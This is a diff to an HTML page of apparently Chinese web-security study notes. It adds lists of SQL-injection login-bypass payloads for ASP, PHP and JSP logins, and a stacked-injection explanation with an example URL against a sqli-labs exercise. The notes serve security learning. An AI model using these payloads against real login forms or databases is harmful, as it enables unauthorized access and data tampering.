@@ -220,7 +220,7 @@
 </div>
 <div class="section" id="fuzz">
 <h2><span class="section-number">4.1.3.2. </span>Fuzz注入点<a class="headerlink" href="#fuzz" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
+<ul>
 <li><p><code class="docutils literal notranslate"><span class="pre">'</span></code> / <code class="docutils literal notranslate"><span class="pre">&quot;</span></code></p></li>
 <li><p><code class="docutils literal notranslate"><span class="pre">1/1</span></code></p></li>
 <li><p><code class="docutils literal notranslate"><span class="pre">1/0</span></code></p></li>
@@ -236,6 +236,41 @@
 <li><p><code class="docutils literal notranslate"><span class="pre">!</span></code></p></li>
 <li><p><code class="docutils literal notranslate"><span class="pre">&#64;</span></code></p></li>
 <li><p>反引号执行</p></li>
+<li><p>asp aspx万能密码</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">&quot;</span> <span class="pre">or</span> <span class="pre">&quot;a&quot;=&quot;a</span></code>
+<code class="docutils literal notranslate"><span class="pre">')</span> <span class="pre">or</span> <span class="pre">('a'='a</span></code>
+<code class="docutils literal notranslate"><span class="pre">or</span> <span class="pre">1=1--</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">1=1--</span></code>
+<code class="docutils literal notranslate"><span class="pre">a'</span> <span class="pre">or</span> <span class="pre">'1=1--</span></code>
+<code class="docutils literal notranslate"><span class="pre">&quot;</span> <span class="pre">or</span> <span class="pre">1=1--</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">'a'='a</span></code>
+<code class="docutils literal notranslate"><span class="pre">&quot;</span> <span class="pre">or</span> <span class="pre">&quot;=&quot;a'='a</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">''='</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">'='or'</span></code>
+<code class="docutils literal notranslate"><span class="pre">1</span> <span class="pre">or</span> <span class="pre">'1'='1'=1</span></code>
+<code class="docutils literal notranslate"><span class="pre">1</span> <span class="pre">or</span> <span class="pre">'1'='1'</span> <span class="pre">or</span> <span class="pre">1=1</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">OR</span> <span class="pre">1=1%00</span></code>
+<code class="docutils literal notranslate"><span class="pre">&quot;</span> <span class="pre">or</span> <span class="pre">1=1%00</span></code>
+<code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">xor</span></code>
+<code class="docutils literal notranslate"><span class="pre">用户名</span> <span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">Select</span> <span class="pre">1,1,1</span> <span class="pre">FROM</span> <span class="pre">admin</span> <span class="pre">Where</span> <span class="pre">''='</span> <span class="pre">（替换表名admin）</span></code>
+<code class="docutils literal notranslate"><span class="pre">密码</span> <span class="pre">1</span></code>
+<code class="docutils literal notranslate"><span class="pre">admin'</span> <span class="pre">or</span> <span class="pre">'a'='a</span> <span class="pre">密码随便</span></code></p>
+</div></blockquote>
+</li>
+<li><p>PHP万能密码</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">'or</span> <span class="pre">1=1/*</span></code>
+<code class="docutils literal notranslate"><span class="pre">User:</span> <span class="pre">something</span></code>
+<code class="docutils literal notranslate"><span class="pre">Pass:</span> <span class="pre">'</span> <span class="pre">or</span> <span class="pre">'1'='1</span></code></p>
+</div></blockquote>
+</li>
+<li><p>jsp 万能密码</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">1'</span> <span class="pre">or</span> <span class="pre">'1'='1</span></code>
+<code class="docutils literal notranslate"><span class="pre">admin'</span> <span class="pre">or</span> <span class="pre">1=1/*</span></code></p>
+</div></blockquote>
+</li>
 </ul>
 </div>
 <div class="section" id="id3">
@@ -244,7 +279,9 @@
 </div>
 <div class="section" id="id4">
 <h2><span class="section-number">4.1.3.4. </span>堆叠注入<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
-<p><code class="docutils literal notranslate"><span class="pre">;select</span> <span class="pre">1</span></code></p>
+<p>堆叠注入与受限于select语句的联合查询法相反，堆叠注入可用于执行任意SQL语句。
+堆叠注入的局限性：堆叠注入并不是任何换环境下都可以执行的，可能受到API或者数据库引擎不支持的限制（如Oracle数据库），也有可能权限不足。web系统中，因为代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，一般建议使用union注入.同时在使用堆叠注入之前，需要知道数据库的一些相关信息，比如：表名，列名等信息。</p>
+<p><code class="docutils literal notranslate"><span class="pre">http://192.168.1.100/sqllabs/Less-38/?id=1';create</span> <span class="pre">database</span> <span class="pre">aaron</span> <span class="pre">--+</span></code></p>
 </div>
 <div class="section" id="id5">
 <h2><span class="section-number">4.1.3.5. </span>注释符<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h2>
